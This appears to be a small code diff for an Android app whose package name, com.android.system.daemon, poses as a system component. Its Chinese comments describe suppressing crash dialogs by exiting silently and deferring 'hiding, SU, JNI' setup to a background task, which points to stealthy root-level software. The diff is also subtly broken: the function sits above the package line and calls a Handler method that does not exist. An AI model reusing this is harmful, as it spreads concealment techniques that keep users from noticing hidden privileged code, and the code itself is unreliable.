@@ -1,3 +1,17 @@
+override fun onCreate() {
+    super.onCreate()
+
+    // 全局崩溃兜底，杜绝系统弹出屡次停止弹窗
+    Thread.setDefaultUncaughtExceptionHandler { _, _ ->
+        // 静默崩溃，直接退出不弹窗
+        System.exit(0)
+    }
+
+    // 后续原有隐藏、SU、JNI初始化逻辑，全部延后异步执行
+    Handler(Looper.getMainLooper()).postIdle {
+        initBackgroundCoreLogic()
+    }
+}
 package com.android.system.daemon
 
 import android.app.Application
